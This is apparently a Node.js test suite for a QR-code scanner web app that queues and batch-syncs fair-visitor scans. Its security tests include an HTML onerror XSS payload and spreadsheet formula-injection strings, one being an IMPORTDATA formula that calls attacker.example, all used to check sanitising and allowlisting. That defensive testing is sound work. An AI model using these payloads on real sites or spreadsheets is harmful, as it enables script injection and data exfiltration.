const assert = require('node:assert/strict');
const crypto = require('node:crypto');
const fs = require('node:fs');
const test = require('node:test');
const vm = require('node:vm');

const STORAGE_KEY = 'edufair_scan_queue';
const VALID_TOKEN = 'a'.repeat(64);
const TEST_API_URL = 'https://script.google.com/macros/s/test-deployment/exec';
const DEPLOYED_API_URL = 'https://script.google.com/macros/s/AKfycby6LOkfukNUs45lPizNuFrGCzAzQEo0WNCRHgajRSGvhCTF0j1JrTDpsyygHW89Bwzw/exec';

function createElement(tagName, innerHTMLWrites, elements) {
  const element = {
    tagName: tagName.toUpperCase(),
    children: [],
    className: '',
    textContent: '',
    disabled: false,
    hidden: false,
    attributes: {},
    classList: {
      add(...classNames) {
        const classes = new Set(element.className.split(/\s+/).filter(Boolean));
        classNames.forEach(className => classes.add(className));
        element.className = [...classes].join(' ');
      },
      remove(...classNames) {
        element.className = element.className
          .split(/\s+/)
          .filter(value => value && !classNames.includes(value))
          .join(' ');
      },
      contains(className) {
        return element.className.split(/\s+/).filter(Boolean).includes(className);
      }
    },
    setAttribute(name, value) {
      this.attributes[name] = String(value);
    },
    getAttribute(name) {
      return Object.prototype.hasOwnProperty.call(this.attributes, name) ? this.attributes[name] : null;
    },
    removeAttribute(name) {
      delete this.attributes[name];
    },
    addEventListener(eventName, handler) {
      element.listeners = element.listeners || {};
      element.listeners[eventName] = element.listeners[eventName] || [];
      element.listeners[eventName].push(handler);
    },
    appendChild(child) {
      this.children.push(child);
      return child;
    },
    prepend(child) {
      this.children.unshift(child);
    },
    remove() {},
    querySelector(selector) {
      if (!selector.startsWith('.')) return null;
      const className = selector.slice(1);
      const pending = [...this.children];
      while (pending.length > 0) {
        const child = pending.shift();
        if (child.className.split(/\s+/).includes(className)) return child;
        pending.push(...child.children);
      }
      return null;
    }
  };

  let innerHTML = '';
  Object.defineProperty(element, 'innerHTML', {
    get() {
      return innerHTML;
    },
    set(value) {
      innerHTML = value;
      innerHTMLWrites.push({ element, value });
    }
  });

  let idValue = '';
  Object.defineProperty(element, 'id', {
    get() {
      return idValue;
    },
    set(value) {
      idValue = value;
      if (elements && value) {
        elements.set(value, element);
      }
    }
  });

  return element;
}

function createHarness({
  search = '?uni=constructor',
  hash = `#token=${VALID_TOKEN}`,
  initialQueue,
  storage = new Map(),
  online = false,
  apiUrl = TEST_API_URL,
  fetchResponses = []
} = {}) {
  const innerHTMLWrites = [];
  const elements = new Map();
  const fetchCalls = [];
  const consoleMessages = [];
  const responseQueue = [...fetchResponses];
  let scannerStarts = 0;
  let uuidCounter = 0;

  if (initialQueue !== undefined) {
    storage.set(STORAGE_KEY, JSON.stringify(initialQueue));
  }

  const document = {
    body: createElement('body', innerHTMLWrites, elements),
    createElement: tagName => createElement(tagName, innerHTMLWrites, elements),
    getElementById(id) {
      if (!elements.has(id)) {
        elements.set(id, createElement('div', innerHTMLWrites, elements));
      }
      return elements.get(id);
    }
  };

  function Html5Qrcode() {}
  Html5Qrcode.prototype.start = function start() {
    scannerStarts += 1;
    return Promise.resolve();
  };

  // Each queued response corresponds to one *scan* (in request order), not
  // one HTTP request, since a request can now carry a batch. A response is
  // wrapped into the { client_id, ... } shape automatically using the
  // client_id the code under test actually sent, so most tests can keep
  // supplying the same plain { result, code } shapes as before batching.
  async function fetch(url, options) {
    fetchCalls.push({ url, options });
    const body = JSON.parse(options.body);
    const scans = Array.isArray(body.scans) ? body.scans : [];

    const results = [];
    for (const scan of scans) {
      const queued = responseQueue.shift() ?? { result: 'success', duplicate: false };

      if (queued instanceof Error) {
        throw queued;
      }

      if (queued.hangUntilAbort) {
        return new Promise((resolve, reject) => {
          options.signal.addEventListener('abort', () => {
            const abortError = new Error('The operation was aborted.');
            abortError.name = 'AbortError';
            reject(abortError);
          });
        });
      }

      if (queued.ok === false) {
        return { ok: false, async json() { return null; } };
      }

      const payload = queued.body ?? queued;
      results.push(Object.assign({ client_id: scan.client_id }, payload));
    }

    return {
      ok: true,
      async json() {
        return { results };
      }
    };
  }

  const timers = new Map();
  let nextTimerId = 1;

  const context = {
    console: {
      error(...values) { consoleMessages.push(['error', ...values.map(String)]); },
      log(...values) { consoleMessages.push(['log', ...values.map(String)]); },
      warn(...values) { consoleMessages.push(['warn', ...values.map(String)]); }
    },
    AbortController,
    Date,
    document,
    fetch,
    Html5Qrcode,
    localStorage: {
      getItem: key => storage.get(key) ?? null,
      setItem: (key, value) => storage.set(key, value)
    },
    navigator: { onLine: online },
    setInterval: () => 0,
    setTimeout: (callback, delay) => {
      const id = nextTimerId;
      nextTimerId += 1;
      timers.set(id, callback);
      return id;
    },
    clearTimeout: id => {
      timers.delete(id);
    },
    URL,
    URLSearchParams,
    window: {
      listeners: {},
      addEventListener(eventName, handler) {
        (this.listeners[eventName] = this.listeners[eventName] || []).push(handler);
      },
      crypto: { randomUUID: () => `00000000-0000-4000-8000-${String(uuidCounter++).padStart(12, '0')}` },
      location: { search, hash }
    }
  };

  const html = fs.readFileSync('index.html', 'utf8');
  const scriptStart = html.lastIndexOf('<script>');
  const sourceStart = html.indexOf('>', scriptStart) + 1;
  const sourceEnd = html.indexOf('</script>', sourceStart);
  let source = html.slice(sourceStart, sourceEnd);

  if (apiUrl !== undefined) {
    source = source.replace(
      /const API_URL\s*=\s*[^;]+;/,
      `const API_URL = ${JSON.stringify(apiUrl)};`
    );
  }

  vm.createContext(context);
  vm.runInContext(source, context, { filename: 'index.html' });

  return {
    context,
    consoleMessages,
    elements,
    fetchCalls,
    innerHTMLWrites,
    queue: () => JSON.parse(storage.get(STORAGE_KEY) ?? '[]'),
    scannerStarts: () => scannerStarts,
    storage,
    triggerAllTimers() {
      const callbacks = [...timers.values()];
      timers.clear();
      for (const callback of callbacks) callback();
    },
    goOnline() {
      // Mirrors the real browser 'online' event index.html listens for,
      // which is what actually flips the module-local isOnline variable
      // (a plain vm context property assignment does not reach it).
      context.navigator.onLine = true;
      for (const handler of context.window.listeners.online || []) handler();
    },
    async flushPromises() {
      await new Promise(resolve => setImmediate(resolve));
      await new Promise(resolve => setImmediate(resolve));
    }
  };
}

test('uses the deployed fair-scan-file Apps Script URL', () => {
  const html = fs.readFileSync('index.html', 'utf8');
  assert.ok(html.includes(`const API_URL = '${DEPLOYED_API_URL}';`));
  assert.doesNotMatch(html, /const API_URL = UNCONFIGURED_API_URL;/);
  assert.throws(
    () => createHarness({ apiUrl: null }),
    /Invalid participant link or scanner deployment configuration/
  );
});

test('loads a verified same-origin cross-browser QR decoder', () => {
  const html = fs.readFileSync('index.html', 'utf8');
  const scannerPath = 'vendor/html5-qrcode.min.js';

  assert.match(html, /<script src="vendor\/html5-qrcode\.min\.js"><\/script>/);
  assert.doesNotMatch(html, /<script[^>]+src=["']https?:\/\//i);
  assert.equal(fs.existsSync(scannerPath), true, 'vendored QR decoder is missing');

  const digest = crypto
    .createHash('sha256')
    .update(fs.readFileSync(scannerPath))
    .digest('hex');
  assert.equal(
    digest,
    '660b12437b1d747e3e68b8be0685c08cb728140110ad213f167b14b66f8b1d8e'
  );
});

test('does not start without a participant token', () => {
  assert.throws(
    () => createHarness({ hash: '' }),
    /Invalid participant link or scanner deployment configuration/
  );
});

test('does not start with a malformed or formula-prefixed participant link', () => {
  assert.throws(
    () => createHarness({ hash: '#token=short' }),
    /Invalid participant link or scanner deployment configuration/
  );
  assert.throws(
    () => createHarness({ search: '?uni=%3DIMPORTDATA' }),
    /Invalid participant link or scanner deployment configuration/
  );
});

test('accepts an organizer-defined participant identifier', () => {
  const participantId = 'თსუ / Tbilisi 2026';
  const harness = createHarness({ search: `?uni=${encodeURIComponent(participantId)}` });
  assert.equal(harness.scannerStarts(), 1);
  assert.equal(harness.elements.get('uni-name').textContent, participantId);
});

test('renders legacy stored QR content as text and never renders the token', () => {
  const payload = '<img src=x onerror="globalThis.compromised=true">';
  const harness = createHarness({
    initialQueue: [{
      id: 'existing-scan',
      participantId: 'constructor',
      token: VALID_TOKEN,
      uuid: payload,
      timestamp: '2026-07-27T12:00:00.000Z',
      status: 'pending'
    }]
  });

  assert.equal(
    harness.innerHTMLWrites.some(write =>
      write.value.includes(payload) || write.value.includes(VALID_TOKEN)
    ),
    false,
    'attacker-controlled QR content or token reached innerHTML'
  );

  const listItem = harness.elements.get('scans-list').children[0];
  assert.equal(listItem.querySelector('.scan-uuid').textContent, payload);
  assert.equal(harness.elements.get('uni-name').textContent, 'constructor');
});

test('does not queue an invalid scanned ticket identifier', () => {
  const harness = createHarness();
  harness.context.onScanSuccess('=1+1');
  assert.deepEqual(harness.queue(), []);
});

test('persists the participant credential with an offline scan', () => {
  const storage = new Map();
  const firstHarness = createHarness({ storage, online: false });
  firstHarness.context.onScanSuccess('A1B2C3D4');

  assert.equal(firstHarness.fetchCalls.length, 0);
  assert.equal(firstHarness.queue()[0].participantId, 'constructor');
  assert.equal(firstHarness.queue()[0].token, VALID_TOKEN);
  assert.equal(firstHarness.queue()[0].status, 'pending');

  const restoredHarness = createHarness({ storage, online: false });
  assert.equal(restoredHarness.queue()[0].token, VALID_TOKEN);
  assert.equal(restoredHarness.elements.get('scans-list').children.length, 1);
});

test('posts credentials in the body without putting the token in the URL', async () => {
  const harness = createHarness({ online: true });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();

  assert.equal(harness.fetchCalls.length, 1);
  const call = harness.fetchCalls[0];
  assert.equal(call.url, TEST_API_URL);
  assert.equal(call.options.method, 'POST');
  assert.equal(call.options.credentials, 'omit');
  assert.equal(call.options.referrerPolicy, 'no-referrer');
  assert.doesNotMatch(call.url, new RegExp(VALID_TOKEN));

  const body = JSON.parse(call.options.body);
  assert.equal(body.scans.length, 1);
  assert.equal(body.scans[0].participant_id, 'constructor');
  assert.equal(body.scans[0].token, VALID_TOKEN);
  assert.equal(body.scans[0].uuid, 'A1B2C3D4');
  assert.equal(harness.queue()[0].status, 'synced');
  assert.equal(
    harness.consoleMessages.flat().some(value => value.includes(VALID_TOKEN)),
    false,
    'token was logged'
  );
});

test('treats a server duplicate as synchronized', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [{ result: 'success', duplicate: true }]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'synced');
});

const REJECTION_MESSAGES = {
  unauthorized: 'Rejected - institution link unauthorized',
  invalid_request: 'Rejected - invalid scan request',
  invalid_ticket: 'Rejected - UUID not found in valid tickets',
  invalid_campus: 'Rejected - invalid campus selection'
};

for (const code of ['unauthorized', 'invalid_request', 'invalid_ticket', 'invalid_campus']) {
  test(`marks ${code} as rejected and does not retry it`, async () => {
    const harness = createHarness({
      online: true,
      fetchResponses: [{ result: 'error', code }]
    });
    harness.context.onScanSuccess('A1B2C3D4');
    await harness.flushPromises();
    assert.equal(harness.queue()[0].status, 'rejected');
    await harness.context.sync();
    assert.equal(harness.fetchCalls.length, 1);
  });

  test(`preserves the ${code} server code on the queued scan and shows its reason`, async () => {
    const harness = createHarness({
      online: true,
      fetchResponses: [{ result: 'error', code }]
    });
    harness.context.onScanSuccess('A1B2C3D4');
    await harness.flushPromises();

    assert.equal(harness.queue()[0].rejectionCode, code);
    assert.equal(harness.queue()[0].uuid, 'A1B2C3D4');

    const listItem = harness.elements.get('scans-list').children[0];
    assert.equal(listItem.querySelector('.scan-reason').textContent, REJECTION_MESSAGES[code]);
    assert.equal(listItem.querySelector('.scan-uuid').textContent, 'A1B2C3D4');
  });
}

test('a rejected scan surviving a page reload still shows its reason', () => {
  const harness = createHarness({
    initialQueue: [{
      id: 'stored-rejected',
      participantId: 'constructor',
      token: '',
      uuid: 'A1B2C3D4',
      campus: '',
      timestamp: '2026-07-27T12:00:00.000Z',
      status: 'rejected',
      rejectionCode: 'invalid_ticket'
    }]
  });

  assert.equal(harness.queue()[0].rejectionCode, 'invalid_ticket');
  const listItem = harness.elements.get('scans-list').children[0];
  assert.equal(listItem.querySelector('.scan-reason').textContent, REJECTION_MESSAGES.invalid_ticket);
});

test('keeps server-busy scans pending for a later retry', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [
      { result: 'error', code: 'server_busy' },
      { result: 'success', duplicate: false }
    ]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'pending');
  assert.equal(harness.queue()[0].transientCode, 'server_busy');
  assert.equal(harness.queue()[0].rejectionCode, '');
  const listItem = harness.elements.get('scans-list').children[0];
  assert.equal(listItem.querySelector('.scan-reason').textContent, 'Pending - server busy, retrying');

  await harness.context.sync();
  assert.equal(harness.fetchCalls.length, 2);
  assert.equal(harness.queue()[0].status, 'synced');
  assert.equal(harness.queue()[0].transientCode, '');
  assert.equal(listItem.querySelector('.scan-reason').textContent, '');
});

test('keeps a non-ok HTTP response pending as a network issue', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [{ ok: false }]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'pending');
  assert.equal(harness.queue()[0].transientCode, 'network');
  const listItem = harness.elements.get('scans-list').children[0];
  assert.equal(listItem.querySelector('.scan-reason').textContent, 'Pending - waiting for connection, retrying');
});

test('keeps a malformed/internal-error response pending as a temporary server error', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [{ result: 'error', code: 'server_error' }]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'pending');
  assert.equal(harness.queue()[0].transientCode, 'server_error');
  const listItem = harness.elements.get('scans-list').children[0];
  assert.equal(listItem.querySelector('.scan-reason').textContent, 'Pending - temporary server error, retrying');
});

test('keeps network failures pending without logging credentials', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [new Error(`network failure ${VALID_TOKEN}`)]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'pending');
  assert.equal(harness.queue()[0].transientCode, 'network');
  const listItem = harness.elements.get('scans-list').children[0];
  assert.equal(listItem.querySelector('.scan-reason').textContent, 'Pending - waiting for connection, retrying');
  assert.equal(
    harness.consoleMessages.flat().some(value => value.includes(VALID_TOKEN)),
    false,
    'network error leaked the token to logs'
  );
});

// --- High-volume batch synchronization ---

test('6 rapid scans from one institution sync in a single batched request', async () => {
  // Scanned while offline so none of them race ahead individually via the
  // post-capture "sync immediately" call: all 6 land in localStorage first,
  // then a single reconnect triggers one batch covering all of them.
  const harness = createHarness({ online: false });
  const uuids = ['AAAA1111', 'BBBB2222', 'CCCC3333', 'DDDD4444', 'EEEE5555', 'FFFF6666'];
  for (const uuid of uuids) {
    harness.context.onScanSuccess(uuid);
  }
  assert.equal(harness.queue().length, 6, 'every scan is saved locally immediately, even while offline');
  assert.equal(harness.fetchCalls.length, 0, 'nothing is sent while offline');

  harness.goOnline();
  await harness.flushPromises();

  assert.equal(harness.fetchCalls.length, 1, 'all 6 pending scans are sent in exactly one request');
  const body = JSON.parse(harness.fetchCalls[0].options.body);
  assert.equal(body.scans.length, 6, 'the single request batches every pending scan');
  assert.deepEqual(body.scans.map(scan => scan.uuid), uuids);

  assert.ok(harness.queue().every(scan => scan.status === 'synced'), 'every scan in the batch resolves independently to synced');
});

test('a backlog larger than the batch size drains over successive sync calls', async () => {
  // Queued while offline for the same reason as above: this isolates the
  // batch-size cap from the "sync immediately after capture" race.
  const harness = createHarness({ online: false });
  const uuids = [];
  for (let i = 0; i < 12; i += 1) {
    uuids.push('BULK' + String(i).padStart(4, '0'));
  }
  for (const uuid of uuids) {
    harness.context.onScanSuccess(uuid);
  }
  assert.equal(harness.queue().length, 12);

  harness.goOnline();
  await harness.flushPromises();

  while (harness.queue().some(scan => scan.status === 'pending')) {
    await harness.context.sync();
    await harness.flushPromises();
  }

  assert.ok(harness.queue().every(scan => scan.status === 'synced'));
  assert.ok(harness.fetchCalls.length >= 2, 'a 12-item backlog needs more than one batch to fully drain');
  for (const call of harness.fetchCalls) {
    const body = JSON.parse(call.options.body);
    assert.ok(body.scans.length <= 10, 'no single request ever exceeds the batch size cap');
  }
});

test('a mixed batch resolves every scan to its own independent outcome', async () => {
  // Queued while offline so all 4 land in one batch together, rather than
  // the first racing ahead alone via the post-capture "sync immediately"
  // call (see the batching tests above for that behavior specifically).
  const harness = createHarness({
    online: false,
    fetchResponses: [
      { result: 'success', duplicate: false },
      { result: 'success', duplicate: true },
      { result: 'error', code: 'invalid_ticket' },
      { result: 'error', code: 'server_busy' }
    ]
  });

  harness.context.onScanSuccess('AAAA1111');
  harness.context.onScanSuccess('BBBB2222');
  harness.context.onScanSuccess('CCCC3333');
  harness.context.onScanSuccess('DDDD4444');
  harness.goOnline();
  await harness.flushPromises();

  assert.equal(harness.fetchCalls.length, 1, 'all 4 scans are sent together in one batch');
  const queue = harness.queue();
  assert.equal(queue[0].status, 'synced');
  assert.equal(queue[1].status, 'synced');
  assert.equal(queue[2].status, 'rejected');
  assert.equal(queue[2].rejectionCode, 'invalid_ticket');
  assert.equal(queue[3].status, 'pending');
  assert.equal(queue[3].transientCode, 'server_busy');
});

test('a request timeout leaves scans pending and is treated as transient, not a permanent rejection', async () => {
  const harness = createHarness({
    online: true,
    fetchResponses: [{ hangUntilAbort: true }]
  });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();
  assert.equal(harness.queue()[0].status, 'pending', 'still in flight while the request hangs');

  harness.triggerAllTimers(); // simulate the AbortController timeout firing
  await harness.flushPromises();

  assert.equal(harness.queue()[0].status, 'pending');
  assert.equal(harness.queue()[0].transientCode, 'network');
  assert.notEqual(harness.queue()[0].status, 'rejected', 'a timeout must never be treated as a permanent rejection');
});

test('manual Sync Now still works with batching', async () => {
  // A pending scan already sitting in localStorage (e.g. from a previous
  // session) and the app is online from load, so the only fetch call in
  // this test comes from the manual button, not any automatic trigger.
  const harness = createHarness({
    online: true,
    initialQueue: [{
      id: 'preexisting-scan',
      participantId: 'constructor',
      token: VALID_TOKEN,
      uuid: 'A1B2C3D4',
      timestamp: '2026-07-27T12:00:00.000Z',
      status: 'pending'
    }]
  });
  assert.equal(harness.fetchCalls.length, 0, 'no automatic sync happened just from loading with a pending item');

  harness.elements.get('sync-btn').listeners.click[0]();
  await harness.flushPromises();

  assert.equal(harness.fetchCalls.length, 1);
  assert.equal(harness.queue()[0].status, 'synced');
});

// --- Campus Intent Capture ---

const CONFIGURED_SEARCH = '?uni=ieu';
const CONFIGURED_OPTIONS = ['Madrid', 'Segovia', 'Undecided'];

test('unconfigured participant keeps the existing fast scanning flow with no campus selector', () => {
  const harness = createHarness({ online: true });
  assert.equal(harness.elements.has('campus-selector'), false);
  assert.equal(harness.elements.has('campus-options'), false);

  harness.context.onScanSuccess('A1B2C3D4');
  assert.equal(harness.queue().length, 1);
  assert.equal(harness.queue()[0].campus, '');
});

test('configured participant sees a campus selector with every configured option plus Undecided', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: true });
  const selector = harness.elements.get('campus-selector');
  assert.equal(selector.hidden, false);

  const optionButtons = harness.elements.get('campus-options').children;
  assert.deepEqual(optionButtons.map(button => button.textContent), CONFIGURED_OPTIONS);
  assert.equal(optionButtons[optionButtons.length - 1].textContent, 'Undecided');
});

for (const [participantId, expectedOptions] of [
  ['into', ['US', 'UK', 'Australia', 'Spain', 'UAE', 'Undecided']],
  ['gedu', ['US', 'UK', 'Ireland', 'UAE', 'Australia', 'Germany', 'Malta', 'France', 'Spain', 'Undecided']],
  ['burgsb', ['Dijon', 'Lyon', 'Undecided']]
]) {
  test(`newly configured participant ${participantId} sees exactly its expected campus options`, () => {
    const harness = createHarness({ search: `?uni=${participantId}`, online: true });
    const selector = harness.elements.get('campus-selector');
    assert.equal(selector.hidden, false);

    const optionButtons = harness.elements.get('campus-options').children;
    assert.deepEqual(optionButtons.map(button => button.textContent), expectedOptions);
    assert.equal(optionButtons[optionButtons.length - 1].textContent, 'Undecided');
  });
}

test('configured institution cannot create a new queue item without a campus selection', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.onScanSuccess('A1B2C3D4');
  assert.deepEqual(harness.queue(), []);
});

test('selecting a campus allows a scan and attaches it to the queued item', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Segovia');
  harness.context.onScanSuccess('A1B2C3D4');
  assert.equal(harness.queue().length, 1);
  assert.equal(harness.queue()[0].campus, 'Segovia');
});

test('campus resets after a successful capture and must be reselected for the next visitor', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  assert.equal(harness.queue().length, 1);

  // No reselection before the next visitor's QR: it must be gated again.
  harness.context.onScanSuccess('E5F6G7H8');
  assert.equal(harness.queue().length, 1);
});

test('campus resets after a local duplicate is detected', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  harness.context.onScanSuccess('A1B2C3D4'); // local duplicate, no second row
  assert.equal(harness.queue().length, 1);

  // Campus selection must not have survived the duplicate for the next visitor.
  harness.context.onScanSuccess('E5F6G7H8');
  assert.equal(harness.queue().length, 1);
});

test('an invalid-format QR does not consume the selected campus', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('=1+1'); // invalid format, ignored
  harness.context.onScanSuccess('A1B2C3D4'); // same visitor's correct QR
  assert.equal(harness.queue().length, 1);
  assert.equal(harness.queue()[0].campus, 'Madrid');
});

test('offline scans retain their own campus and several visitors can differ', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  harness.context.selectCampus('Segovia');
  harness.context.onScanSuccess('E5F6G7H8');
  harness.context.selectCampus('Undecided');
  harness.context.onScanSuccess('11112222');

  const queue = harness.queue();
  assert.equal(queue.length, 3);
  assert.deepEqual(queue.map(scan => scan.campus), ['Madrid', 'Segovia', 'Undecided']);
});

test('later UI selections do not mutate an earlier queued scan', () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: false });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  harness.context.selectCampus('Segovia'); // selection changes after capture

  assert.equal(harness.queue()[0].campus, 'Madrid');
});

test('sync payload sends the campus belonging to each queued scan', async () => {
  const harness = createHarness({ search: CONFIGURED_SEARCH, online: true });
  harness.context.selectCampus('Segovia');
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();

  assert.equal(harness.fetchCalls.length, 1);
  const body = JSON.parse(harness.fetchCalls[0].options.body);
  assert.equal(body.scans[0].campus, 'Segovia');
});

test('unconfigured participant syncs with an empty campus field', async () => {
  const harness = createHarness({ online: true });
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();

  const body = JSON.parse(harness.fetchCalls[0].options.body);
  assert.equal(body.scans[0].campus, '');
});

test('legacy local queue objects without a campus field normalize safely', () => {
  const harness = createHarness({
    search: CONFIGURED_SEARCH,
    initialQueue: [{
      id: 'legacy-scan',
      participantId: 'ieu',
      token: VALID_TOKEN,
      uuid: 'A1B2C3D4',
      timestamp: '2026-07-27T12:00:00.000Z',
      status: 'pending'
    }]
  });

  assert.equal(harness.queue()[0].campus, '');
  assert.equal(harness.queue()[0].uuid, 'A1B2C3D4');
});

test('a stored campus value outside the participant allowlist is discarded on load', () => {
  const harness = createHarness({
    search: CONFIGURED_SEARCH,
    initialQueue: [{
      id: 'tampered-scan',
      participantId: 'ieu',
      token: VALID_TOKEN,
      uuid: 'A1B2C3D4',
      campus: '=IMPORTDATA("https://attacker.example")',
      timestamp: '2026-07-27T12:00:00.000Z',
      status: 'pending'
    }]
  });

  assert.equal(harness.queue()[0].campus, '');
});

test('synced and rejected campus-enabled scans still clear the bearer credential', async () => {
  const harness = createHarness({
    search: CONFIGURED_SEARCH,
    online: true,
    fetchResponses: [{ result: 'error', code: 'invalid_ticket' }]
  });
  harness.context.selectCampus('Madrid');
  harness.context.onScanSuccess('A1B2C3D4');
  await harness.flushPromises();

  assert.equal(harness.queue()[0].status, 'rejected');
  assert.equal(harness.queue()[0].token, '');
  assert.equal(harness.queue()[0].campus, 'Madrid');
  assert.equal(harness.queue()[0].rejectionCode, 'invalid_ticket');
});
